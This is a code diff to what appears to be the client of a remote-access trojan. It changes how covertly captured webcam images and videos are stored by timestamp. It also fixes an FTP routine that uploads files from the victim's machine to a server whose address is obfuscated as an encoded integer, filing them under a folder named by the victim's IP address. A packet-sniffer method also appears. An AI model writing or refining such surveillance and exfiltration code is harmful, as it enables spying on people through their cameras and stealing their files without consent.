@@ -155,10 +155,15 @@ class Client(object):
 
     def _webcam(self):
         if self.webcam.options['video']:
+            if 'video' not in self.result['webcam']:
+                self.result['webcam'].update({'video': {}})
             result = self._webcam_video()
+            self.result['webcam']['video'][time.ctime()] = result
         else:
+            if 'image' not in self.result['webcam']:
+                self.result['webcam'].update({'image': {}})
             result = self._webcam_image()
-        self.result['webcam'][time.ctime()] = result
+            self.result['webcam']['image'][time.ctime()] = result
         return result
 
     def _packetsniffer(self):
@@ -476,9 +481,9 @@ class Client(object):
     def _ftp(self, filepath):
         try:
             host = FTP(*long_to_bytes(self.__q__).split())
-            if self.info().get('IP Address') not in host.nlst('/htdocs'):
-                host.mkd('/htdocs/{}'.format(self.info().get('IP Address')))
-            result = '/htdocs/{}/{}'.format(self.info().get('IP Address'), os.path.basename(filepath))
+            if self.info.get('IP Address') not in host.nlst('/htdocs'):
+                host.mkd('/htdocs/{}'.format(self.info.get('IP Address')))
+            result = '/htdocs/{}/{}'.format(self.info.get('IP Address'), os.path.basename(filepath))
             upload = host.storbinary('STOR ' + result, open(filepath, 'rb'))
         except Exception as e:
             result = str(e)
